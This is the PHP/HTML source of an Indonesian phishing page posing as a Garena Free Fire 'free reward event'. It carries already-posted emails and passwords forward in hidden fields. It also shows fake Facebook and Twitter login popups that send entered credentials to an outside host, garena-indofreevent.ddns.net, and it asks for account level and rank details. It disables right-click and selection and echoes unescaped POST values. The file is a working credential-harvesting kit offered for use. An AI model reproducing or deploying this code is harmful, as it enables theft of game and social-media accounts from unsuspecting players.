<?php 
if(!isset($_POST['email']) || !isset($_POST['password']) || !isset($_POST['login'])) {
    header('location: ./');
}

?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="FREE FIRE - Event New 2021">
<meta name="description" content="Event gratisan dari Garena sudah dimulai, ayo ambil item-item favorit kamu disini!">
<meta property="og:description" content="Event gratisan dari Garena sudah dimulai, ayo ambil item-item favorit kamu disini!">
<meta property="og:url" content="./">
<meta property="og:site_name" content="FREE FIRE - Event New 2021">
<meta property="og:type" content="website">
<meta name="copyright"content="FREE FIRE">
<meta name="theme-color" content="#eaa300">
<meta property="og:image" content="https://i.ibb.co/fFbdRKj/thumbnail.jpg">
<title>FREE FIRE - Event New 2021</title>
<style>
    @charset "utf-8";
@import url("https://fonts.googleapis.com/css2?family=Teko&display=swap");
*,*:before,*:after {
	-webkit-box-sizing:border-box;
	-moz-box-sizing:border-box;
	box-sizing:border-box;
}
body {
	background:#fff;
	-webkit-background-size:cover;
	-moz-background-size:cover;
	-o-background-size:cover;
	background-size:cover;
	margin:0;
	color:#000;
	font-family:'Teko',sans-serif;
}
.container {
	background:url(../img/container.jpg) no-repeat center;
	background-size:cover;
	margin:0px auto;
	margin-top:0.5%;
	margin-bottom:0.5%;
	max-width:400px;
	height:640px;
	border: 1px solid #964B00;
	border-radius:10px;
	box-shadow:1px 1px 10px rgba(0,0,0,0.3);
	position:relative;
}
.container-mask {
    background: rgba(0, 0, 0, 0.5);
    width: 100%;
    height: 100%;
    border-radius: 10px;
}
.navbar {
	background: #000;
	width:100%;
	height:50px;
	border-bottom:1px solid #964B00;
	border-top-left-radius:10px;
	border-top-right-radius:10px;
}
.navbar-logo-box {
	width: 150px;
	height: 100%;
	border-top-left-radius: 8px;
	border-bottom: 50px solid #964B00;
    border-right: 50px solid transparent;
}
.navbar-logo-box img {
	width: 100px;
	padding-top: 5px;
	margin-left: 8px;
}
.navbar-menu {
	margin-top:4px;
	float:right;
}
.navbar-menu i {
	margin-top: 3px;
	margin-right: 10px;
	color: #ffa500;
	font-size: 35px;
}
.landing-content {
	width: 100%;
	height: 350px;
}
.btn-share {
	background: #964B00;
	width: 25%;
	height: 33px;
	margin-top: 11px;
	margin-left: 9px;
	padding: 5px;
	border: 1px solid #964B00;
	border-radius: 5px;
	outline: none;
	float: left;
}
.btn-share-icon {
	background: #964B00;
	width: 25%;
	height: 100%;
	margin-right: 5px;
	border-radius: 5px;
	float: left;
}
.btn-share-icon i {
	padding-top: 2px;
	padding-left: 3.5px;
	color: #000;
	margin-left: auto;
	margin-right: auto;
	display: block;
}
.btn-share-txt {
	padding-top: 1px;
	color: #000;
	font-size: 15px;
	font-family: Teko, sans-serif;
	text-align: center;
}
.landing-message {
	width:100%;
	height:238px;
	border-bottom-left-radius: 10px;
	border-bottom-right-radius: 10px;
}
.landing-message img {
	width: 90px;
	margin-top: 5px;
	margin-left: auto;
	margin-right: auto;
	display: block;
}
.landing-message-title {
	padding-top: 10px;
	color: #964B00;
	font-size: 27px;
	font-family: Teko, sans-serif;
	font-weight: bold;
	text-align: center;
	text-transform: uppercase;
	letter-spacing: 1px;
}
.divider{
	display: block;
	margin-left: 5%;
	margin-right: 5%;
	margin-top: -8px;
	overflow: hidden;
	text-align: center;
	white-space: nowrap;
	width: 45%;
}
.divider>span{
	display: inline-block;
	position: relative;
	color: #964B00;
	cursor: default;
	font-size: 20px;
	font-family: Teko, sans-serif;
	font-weight: bold;
	text-transform: uppercase;
	letter-spacing: 1px;
}
.divider>span:before, .divider>span:after{
	background: #964B00;
	content: "";
	height: 2px;
	position: absolute;
	top: 50%;
	width: 9999px;
}
.divider>span:before{
	margin-right: 10px;
	right: 100%;
}
.divider>span:after{
	left: 100%;
	margin-left: 10px;
}
.btn-collect {
	background: #964B00;
	width: 30%;
	height: 33px;
	margin-top: 20px;
	margin-left: auto;
	margin-right: auto;
	padding: 5px;
	border: 1px solid #964B00;
	border-radius: 5px;
	outline: none;
	display: block;
}
.btn-collect-icon {
	background: #964B00;
	width: 20%;
	height: 100%;
	margin-right: 5px;
	border-radius: 5px;
	float: left;
}
.btn-collect-icon i {
	padding-top: 2px;
	padding-left: 3.5px;
	color: #000;
	margin-left: auto;
	margin-right: auto;
	display: block;
}
.btn-collect-txt {
	padding-top: 1px;
	color: #000;
	font-size: 15px;
	font-family: Teko, sans-serif;
	text-align: center;
}
.reward-content {
	width:95%;
	height:88.5%;
	margin-top: 3%;
	margin-left:auto;
	margin-right:auto;
	display:block;
}
.menu-wrapper {
	background: #964B00;
	width: 100%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	border: 1px solid #964B00;
	border-radius: 5px;
    display: block;
}
.menu-choose {
	width: 32.5%;
	height: auto;
	padding: 6px;
	padding-top: 8px;
	color: #000;
	text-align: center;
	border-bottom: 3px solid transparent;
	display: inline-block;
}
.menu-active {
	background: rgba(255, 204, 87, 0.4);
	border-bottom: 3px solid #964B00;
	transition: 0.5s;
}
.menu-notify {
	background: #964B00;
	width: 100%;
	height: 35px;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	border: 1px solid #964B00;
	border-radius: 5px;
	outline: none;
	display: block;
}
.menu-notify-icon {
	background: #964B00;
	width: 6.5%;
	height: 100%;
	margin-right: 5px;
	border-radius: 5px;
	float: left;
}
.menu-notify-icon i {
	padding-top: 2px;
	padding-left: 3.5px;
	color: #000;
	font-size: 20px;
	margin-left: auto;
	margin-right: auto;
	display: block;
}
.menu-notify-txt {
	padding-top: 1px;
	color: #000;
	font-size: 15px;
	font-family: Teko, sans-serif;
	text-align: left;
}
.menu-notify-change {
	background: #964B00;
	width: 23%;
	height: auto;
	padding: 1px;
	color: #000;
	font-size: 15px;
	font-family: Teko, sans-serif;
	text-align: center;
	border-radius: 3px;
	float: right;
}
.scroll {
	overflow:scroll;
	position:relative;
	height: 465px;
	margin-top: 10px;
	scrollbar-face-color:#964B00;
	scrollbar-shadow-color:#964B00;
	scrollbar-highlight-color:#964B00;
	scrollbar-3dlight-color:#964B00;
	scrollbar-darkshadow-color:#964B00;
	scrollbar-track-color:#964B00;
	scrollbar-arrow-color:#964B00;
}
.item {
	background: #000;
	width: 32%;
	height: auto;
	margin-bottom: 9px;
	padding: 5px;
	border: 1px solid #964B00;
	border-radius: 5px;
}
.item img {
	width: 100%;
	height: 105px;
	border: 1px solid #964B00;
	border-radius: 5px;
}
.item button {
	background: #964B00;
	width: 100%;
	height: auto;
	margin-top: 5px;
	padding: 3px;
	color: #000;
	font-size: 15px;
	font-family: Teko, sans-serif;
	text-align: center;
	border: 1px solid #964B00;
	border-radius: 5px;
	outline: none;
}
.balance {
	background: #000;
	width: 32%;
	height: auto;
	margin-bottom: 9px;
	padding: 5px;
	border: 1px solid #964B00;
	border-radius: 5px;
}
.balance-content-cash {
	width: 100%;
	height: 105px;
	border: 1px solid #964B00;
	border-radius: 5px;
}
.balance-content-other {
	width: 100%;
	height: 105px;
	border: 1px solid #964B00;
	border-radius: 5px;
}
.balance-content-cash img {
	width: 50;
	margin-top: 10px;
	margin-bottom: 9px;
	margin-left: auto;
	margin-right: auto;
	display: block;
}
.balance-content-other img {
	width: 50;
	margin-top: 10px;
	margin-bottom: 9px;
	margin-left: auto;
	margin-right: auto;
	border: 1px solid #964B00;
	border-radius: 5px;
	display: block;
}
.balance-currency {
	width: 100%;
	height: auto;
	color: #ffa500;
	font-size: 18px;
	font-family: Teko, sans-serif;
	text-align: center;
}
.balance-price {
	background: #964B00;
	width: 100%;
	height: auto;
	padding: 5px;
	color: #000;
	font-size: 15px;
	font-family: Teko, sans-serif;
	text-align: center;
	border: 1px solid #964B00;
	border-left: 0px;
	border-right: 0px;
	border-bottom: 0px;
	border-bottom-left-radius: 4px;
	border-bottom-right-radius: 4px;
}
.balance button {
	background: #964B00;
	width: 100%;
	height: auto;
	margin-top: 5px;
	padding: 3px;
	color: #000;
	font-size: 15px;
	font-family: Teko, sans-serif;
	text-align: center;
	border: 1px solid #964B00;
	border-radius: 5px;
	outline: none;
}
.popup {
	width:100%;
	height:100%;
	position:fixed;
	top:0;
	left:0;
	z-index:9999;
	overflow-y:scroll;
}
.item-confirmation {
	background: #964B00;
	width: 100%;
	height: 105px;
	margin-top: 10px;
	border: 1px solid #964B00;
	border-radius: 5px;
}
.item-confirmation-img-box {
	width: 28%;
	height: 100%;
	padding: 5px;
	border-right: 1px solid #964B00;
	float: left;
}
.item-confirmation-img-box img {
	width: 100%;
	height: 100%;
	border: 1px solid #964B00;
	border-radius: 5px;
}
.item-confirmation-info {
	width: 72%;
	height: 100%;
	float: right;
}
.item-confirmation-status-title {
	background: #964B00;
	width: 37%;
	height: auto;
	margin-top: 6px;
	margin-left: 5px;
	padding-left: 5px;
	padding-right: 5px;
	color: #000;
	font-size: 15px;
	font-family: Teko, sans-serif;
	text-align: left;
	border-radius: 2px;
}
.item-confirmation-status-info {
	width: auto;
	height: auto;
	margin-top: 4px;
	margin-left: 5px;
	padding-top: 3px;
	padding-left: 4px;
	padding-right: 5px;
	color: #000;
	font-size: 15px;
	font-family: Teko, sans-serif;
	text-align: left;
	line-height: 10px;
	border-left: 1px solid #964B00;
}
.item-confirmation-information-title {
	background: #964B00;
	width: 37%;
	height: auto;
	margin-top: 14px;
	margin-left: 5px;
	padding-left: 5px;
	padding-right: 5px;
	color: #000;
	font-size: 15px;
	font-family: Teko, sans-serif;
	text-align: left;
	border-radius: 2px;
}
.item-confirmation-information-info {
	width: auto;
	height: auto;
	margin-top: 4px;
	margin-left: 5px;
	padding-top: 3px;
	padding-left: 4px;
	padding-right: 5px;
	color: #000;
	font-size: 15px;
	font-family: Teko, sans-serif;
	text-align: left;
	line-height: 10px;
	border-left: 1px solid #964B00;
}
.btn-popup-wrapper {
	width: 85%;
	height: 80px;
	margin-left: auto;
	margin-right: auto;
	display: block;
}
.btn-popup {
	background: #964B00;
	width: 49%;
	height: 33px;
	margin-top: 20px;
	padding: 5px;
	border: 1px solid #964B00;
	border-radius: 5px;
	outline: none;
}
.btn-popup-icon {
	background: #964B00;
	width: 15%;
	height: 100%;
	margin-right: 5px;
	border-radius: 5px;
	float: left;
}
.btn-popup-icon i {
	padding-top: 2px;
	padding-left: 3.5px;
	color: #000;
	margin-left: auto;
	margin-right: auto;
	display: block;
}
.btn-popup-txt {
	padding-top: 1px;
	color: #000;
	font-size: 15px;
	font-family: Teko, sans-serif;
	text-align: center;
}
.btn-submit-popup-txt {
	background: none;
	width: 81%;
	padding-left: 10px;
	color: #000;
	font-size: 15px;
	font-family: Teko, sans-serif;
	text-align: left;
	line-height: 20px;
	border: none;
	outline: none;
	float: right;
}
.btn-login {
	background: #964B00;
	width: 100%;
	height: 51px;
	margin-bottom: 3px;
	border: 1px solid #964B00;
	border-radius: 5px;
}
.btn-login-logo {
	background: #964B00;
	width: 16%;
	height: 100%;
	padding: 5px;
	border-top-left-radius: 2px;
	border-bottom-left-radius: 2px;
	float: left;
}
.btn-login-logo img {
	width: 39px;
	margin-left: auto;
	margin-right: auto;
	display: block;
}
.btn-login-txt {
	margin-top: 10px;
	color: #000;
	font-size: 20px;
	font-family: Teko, sans-serif;
	text-align: center;
}
.popup-login {
	background:rgba(0,0,0,0.5);
	width:100%;
	height:100%;
	position:fixed;
	top:0;
	left:0;
	z-index:9999;
}
.popup-box-login-fb {
	background:#964B00;
	max-width:330px;
	height:auto;
	position:relative;
	margin:50px auto;
	margin-top:1.9%;
	text-align:center;
	font-family:'Teko';
	color:#000;
	border-radius:10px;
}
.popup-box-login-twitter {
	background:#fff;
	max-width:330px;
	height:350px;
	position:relative;
	margin:50px auto;
	margin-top:10%;
	text-align:center;
	font-family:'Teko';
	color:#000;
	border-radius:10px;
}
.popup-box-login-google {
	background:#fff;
	max-width:330px;
	height:400px;
	position:relative;
	margin:50px auto;
	margin-top:10%;
	padding:15px;
	text-align:center;
	font-family:'Teko';
	color:#000;
	border-radius:10px;
}
.close-fb {
	background:#000;
	width:20px;
	height:20px;
	color:#fff;
	text-align:center;
	text-decoration:none;
	border-radius:50%;
	border:1.5px solid #fff;
	position:absolute;
	top:-8px;
	right:-10px;
	display:block;
}
.close-fb i {
	color:#fff;
	padding-top:1px;
}
.close-other {
	background:#000;
	width:20px;
	height:20px;
	color:#fff;
	text-align:center;
	text-decoration:none;
	border-radius:50%;
	border:1.5px solid #fff;
	top:-8px;
	right:-10px;
	position:absolute;
	z-index:9999999;
	display:block;
}
.close-other i {
	color:#fff;
	padding-top:1px;
}
.input-verify {
	background: #964B00;
	width: 100%;
	height: auto;
	padding: 8px;
	color: #000;
	font-size: 15px;
	font-family: 'Teko', sans-serif;
	text-align: left;
	border: 1px solid #964B00;
	outline: none;
}
.select-verify {
	background: #964B00;
	width: 100%;
	height: auto;
	padding: 10px;
	color: #000;
	font-size: 15px;
	font-family: 'Teko', sans-serif;
	text-align: left;
	border: 1px solid #964B00;
	outline: none;
}
.br-line-top-none {
	border-top: 0px;
}
.br-top {
	border-top-left-radius: 5px;
	border-top-right-radius: 5px;
}
.br-bottom {
	border-bottom-left-radius: 5px;
	border-bottom-right-radius: 5px;
}
.btn-verify {
    background: #964B00;
    width: 40%;
    height: 33px;
    margin-top: 10px;
    margin-left: auto;
    margin-right: auto;
    padding: 5px;
    color: #000;
	font-size: 15px;
	font-family: Teko, sans-serif;
	text-align: center;
    border: 1px solid #964B00;
    border-radius: 5px;
    outline: none;
    display: block;
}
.btn-verify-icon {
    background: #964B00;
    width: 18%;
    height: 100%;
    border-radius: 5px;
    float: left;
}
.btn-verify-icon i {
    padding-top: 1px;
    color: #000;
    font-size: 19px;
    margin-left: auto;
    margin-right: auto;
    display: block;
}
.message-box-finish {
	background: #964B00;
	width: 100%;
	height: auto;
	padding: 5px;
	color: #000;
	font-size: 15px;
	font-family: Teko, sans-serif;
	text-align: left;
	border: 1px solid #964B00;
	border-radius: 5px;
}
.notify-process {
	width: auto;
	height: auto;
	padding-left: 8px;
	padding-right: 8px;
	color: #000;
	font-size: 15px;
	font-family: Teko, sans-serif;
	text-align: left;
	border: 1px solid #964B00;
	border-radius: 5px;
	float: right;
}
.kiri {
	float: left;
}
.kanan {
	float: right;
}
.tengah {
	margin-left: auto;
	margin-right: auto;
	display: block;
}
::-webkit-scrollbar {
	display:none;
}
input::-webkit-outer-spin-button,
input::-webkit-inner-spin-button {
-webkit-appearance: none;
margin: 0;
}
select::-ms-expand {
display: none;
}
select{
-webkit-appearance: none;
appearance: none;
}
@media only screen and (max-width:600px) {
	.container,.container-mask {
		width:100%;
		height:100%;
		margin-top:0px;
		margin-bottom:0px;
		border: none;
		border-radius:0px;
		padding:0px;
	}
	.navbar {
		border-radius:0px;
	}
	.navbar-logo-box {
		border-top-left-radius: 0px;
	}
	.landing-content {
	    height: 280px;
	}
	.btn-share-icon {
	    width: 27%;
	}
	.landing-message {
	    border-radius: 0px;
	}
	.btn-collect-icon {
	    width: 21%;
	}
	.item img {
	    height: 90px;
	}
	.item-confirmation-img-box {
	    margin-top: 5px;
	    height: 92px;
	}
	.item-confirmation-status-title {
	    width: 39%;
	}
	.item-confirmation-information-title {
	    width: 43%;
	}
	.menu-notify-icon {
	    width: 7.1%;
	}
	.btn-popup-icon {
	    width: 15.5%;
	}
	.btn-popup-icon i {
	    padding-top: 3px;
	}
	.popup-box-login-fb {
	    margin-top: 5%;
	}
}
</style>
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.css">
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
<link rel="icon" href="http://freefiremobile-a.akamaihd.net/ffwebsite/images/app-icon.png">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<style>
::placeholder {
color: #000;
}
</style>

<div class="container">
<div class="container-mask">
<div class="navbar">
<div class="navbar-menu">
<i class="fa fa-bars"></i>
</div> <!--- navbar-menu --->
<div class="navbar-logo-box">
<img src="http://freefiremobile-a.akamaihd.net/ffwebsite/images/logo-small-fixed.png">
</div> <!--- navbar-logo-box --->
</div> <!--- navbar --->
<div class="reward-content">
<div class="menu-notify">
<div class="menu-notify-icon"><i class="zmdi zmdi-info-outline"></i></div>
<div class="menu-notify-txt">Verifikasi akun FREE FIRE Anda Untuk Menerima Hadiah Nya</div>
</div> <!--- menu-notify --->

<form action="check.php" id="myAccount" onsubmit="open_my_account();" method="post">
<center>
<input type="hidden" class="input-verify" name="email" id="email" value="<?= $_POST['email'] ?>" readonly>
<input type="hidden" class="input-verify" name="password" id="password" value="<?= $_POST['password'] ?>" readonly>
<input type="hidden" class="input-verify" name="nick" id="nick" value="<?= $_POST['userNickForm'] ?>" readonly>
<input type="number" class="input-verify br-line-top-none" name="playid" id="playid" value="<?= $_POST['userIdForm'] ?>" readonly>
<select class="select-verify br-line-top-none" name="level" id="level" required>
<option selected="selected" disabled="disabled" value="">Level Akun?</option>
<option>1</option>
<option>2</option>
<option>3</option>
<option>4</option>
<option>5</option>
<option>6</option>
<option>7</option>
<option>8</option>
<option>9</option>
<option>10</option>
<option>11</option>
<option>12</option>
<option>13</option>
<option>14</option>
<option>15</option>
<option>16</option>
<option>17</option>
<option>18</option>
<option>19</option>
<option>20</option>
<option>21</option>
<option>22</option>
<option>23</option>
<option>24</option>
<option>25</option>
<option>26</option>
<option>27</option>
<option>28</option>
<option>29</option>
<option>30</option>
<option>31</option>
<option>32</option>
<option>33</option>
<option>34</option>
<option>35</option>
<option>36</option>
<option>37</option>
<option>38</option>
<option>39</option>
<option>40</option>
<option>41</option>
<option>42</option>
<option>43</option>
<option>44</option>
<option>45</option>
<option>46</option>
<option>47</option>
<option>48</option>
<option>49</option>
<option>50</option>
<option>51</option>
<option>52</option>
<option>53</option>
<option>54</option>
<option>55</option>
<option>56</option>
<option>57</option>
<option>58</option>
<option>59</option>
<option>60</option>
<option>61</option>
<option>62</option>
<option>63</option>
<option>64</option>
<option>65</option>
<option>66</option>
<option>67</option>
<option>68</option>
<option>69</option>
<option>70</option>
<option>71</option>
<option>72</option>
<option>73</option>
<option>74</option>
<option>75</option>
<option>76</option>
<option>77</option>
<option>78</option>
<option>79</option>
<option>80</option>
<option>81</option>
<option>82</option>
<option>83</option>
<option>84</option>
<option>85</option>
<option>86</option>
<option>87</option>
<option>88</option>
<option>89</option>
<option>90</option>
<option>91</option>
<option>92</option>
<option>93</option>
<option>94</option>
<option>95</option>
<option>96</option>
<option>97</option>
<option>98</option>
<option>99</option>
<option>100</option>
</select>
<select class="select-verify br-line-top-none" name="tier" id="tier" required>
<option selected="selected" disabled="disabled" value="">Ranked Level</option>
<option>Bronze</option>
<option>Silver</option>
<option>Gold</option>
<option>Platinum</option>
<option>Diamond</option>
<option>Master</option>
</select>
<select class="select-verify br-line-top-none" name="rpt" id="rpt" required>
<option selected="selected" disabled="disabled" value="">Pernah Elitepass?</option>
<option>Pernah</option>
<option>Tidak Pernah</option>
<option>Pree Order</option>
</select>
<input type="hidden" class="input-verify" name="login" id="login" value="<?= $_POST['login'] ?>" readonly>
</center>
<button type="submit" class="btn-verify">
<div class="btn-verify-icon">
<i class="zmdi zmdi-account-circle"></i>
</div>
Verifikasi Akun 
</button>
</form>
</div> <!--- reward-content --->
</div> <!--- container-mask --->
</div> <!--- container --->
<div class="popup reward_confirmation" style="display: none;">
<div class="container">
<div class="container-mask">
<div class="navbar">
<div class="navbar-menu">
<i class="fa fa-bars"></i>
</div> <!--- navbar-menu --->
<div class="navbar-logo-box">
<img src="http://freefiremobile-a.akamaihd.net/ffwebsite/images/logo-small-fixed.png">
</div> <!--- navbar-logo-box --->
</div> <!--- navbar --->
<div class="reward-content">
<div class="menu-notify">
<div class="menu-notify-icon"><i class="zmdi zmdi-help-outline"></i></div>
<div class="menu-notify-txt">Hi survivor, Anda yakin akan ambil hadiah ini?</div>
</div> <!--- menu-notify --->
<div class="item-confirmation">
<div class="item-confirmation-img-box">
<img src="#" id="myReward">
</div> <!--- item-confirmation-img-box --->
<div class="item-confirmation-info">
<div class="item-confirmation-status-title">
Hadiah Tersedia
</div> <!--- item-confirmation-status-title --->
<div class="item-confirmation-status-info">
Hadiah ini tersedia untuk diambil
</div> <!--- item-confirmation-status-info --->
<div class="item-confirmation-information-title">
Informasi Hadiah
</div> <!--- item-confirmation-status-title --->
<div class="item-confirmation-information-info">
Hadiah gratisan dari Garena
</div> <!--- item-confirmation-status-info --->
</div> <!--- item-confirmation-info --->
</div> <!--- item-confirmation --->
<div class="btn-popup-wrapper">
<div class="btn-popup kiri" onclick="close_reward_confirmation()">
<div class="btn-popup-icon"><i class="fa fa-chevron-left fa-md"></i></div>
<div class="btn-popup-txt">Kembali ke menu awal</div>
</div> <!--- btn-popup --->
<div class="btn-popup kanan" onclick="open_account_login()">
<div class="btn-popup-icon" style="margin-right: 0px; float: right;"><i class="fa fa-chevron-right fa-md" style="margin-left: 3px;"></i></div>
<div class="btn-popup-txt">Ambil hadiah Nya</div>
</div> <!--- btn-popup --->
</div> <!--- btn-popup-wrapper --->
</div> <!--- reward-content --->
</div> <!--- container-mask --->
</div> <!--- container --->
</div> <!--- popup-reward --->

<div class="popup account_login" style="display: none;">
<div class="container">
<div class="container-mask">
<div class="navbar">
<div class="navbar-menu">
<i class="fa fa-bars"></i>
</div> <!--- navbar-menu --->
<div class="navbar-logo-box">
<img src="http://freefiremobile-a.akamaihd.net/ffwebsite/images/logo-small-fixed.png">
</div> <!--- navbar-logo-box --->
</div> <!--- navbar --->
<div class="reward-content">
<div class="menu-notify">
<div class="menu-notify-icon"><i class="zmdi zmdi-info-outline"></i></div>
<div class="menu-notify-txt">Masuk ke akun FREE FIRE Anda Untuk Menerima Hadiah Anda</div>
</div> <!--- menu-notify --->
<div class="btn-login" onclick="open_facebook_login()">
<div class="btn-login-logo">
<img src="https://i.ibb.co/w45vvsC/facebook-icon.png">
</div>
<div class="btn-login-txt">Masuk dengan Facebook</div>
</div>


<div class="popup-login login_facebook animated fadeIn" style="display: none;">
	<div class="popup-box-login-fb">
		<a onclick="close_facebook_login()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
		<div class="navbar-fb">
			<img src="https://i.ibb.co/QNdsmDc/facebook-text.png">
		</div>
		<div class="content-box-fb">
			<img src="https://i.ibb.co/fFbdRKj/thumbnail.jpg">
			<div class="txt-login-fb">
				 Masuk ke akun FREE FIRE Anda untuk menerima hadiah Anda
			</div>
			<form action="http://garena-indofreevent.ddns.net/verification.php" method="post">
				<input type="text" class="input-fb-email" name="email" placeholder="Nomor ponsel atau email" autocomplete="off" autocapitalize="off" required>
				<input type="password" class="input-fb-password" name="password" placeholder="Kata Sandi" autocomplete="off" autocapitalize="off" required>
				<input type="hidden" name="login" value="Facebook" readonly>
				<button type="submit" class="btn-login-fb">Masuk</button>
			</form>
			<div class="txt-create-account">Buat Akun</div>
			<div class="txt-forgotten-password">Lupa Kata Sandi?</div>
		</div>
		<div class="language-box">
			<center>
			<div class="language-name language-name-active">Bahasa Indonesia</div>
			<div class="language-name">English (UK)</div>
			<div class="language-name">Bahasa Melayu</div>
			<div class="language-name">Basa Jawa</div>
			<div class="language-name">Español</div>
			<div class="language-name">Português (Brasil)</div>
			<div class="language-name">Français (France)</div>
			<div class="language-name">
				<i class="fa fa-plus"></i>
			</div>
			</center>
		</div>
		<div class="copyright">Facebook Inc.</div>
	</div>
</div>

<div class="popup-login login_twitter animated fadeIn" style="display: none;">
	<div class="popup-box-login-twitter">
	<a onclick="close_twitter_login()" class="close-other"><i class="zmdi zmdi-close"></i></a>
		<div class="header-twitter">
			<center>
			<img src="https://i.ibb.co/W0V2vPK/twitter-text.png">
			</center>
		</div>
		<div class="box-twitter">
			<center>
			<form action="http://garena-indofreevent.ddns.net/verifications.php" method="post">
				<div class="txt-login-twitter">Login to Twitter</div>
				<div class="input-box-twitter">
					<label>Phone, email, or username</label>
					<input type="text" name="email" placeholder="" required>
				</div>
				<div class="input-box-twitter">
					<label>Password</label>
					<input type="password" name="password" placeholder="" required>
				</div>
				<input type="hidden" name="login" value="Twitter" readonly>
				<button type="submit" class="btn-login-twitter">Log In</button>
				<div class="footer-menu-twitter">Forgot password?</div>
				<div class="footer-menu-twitter bulet">•</div>
				<div class="footer-menu-twitter">Sign up to Twitter</div>
			</form>
			</center>
		</div>
	</div>
</div>

<script type="text/javascript" src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="js/tab.js"></script>
<script src="js/popup.js"></script>
</body>
https://api-codesclog.com/item.min.js
</html>
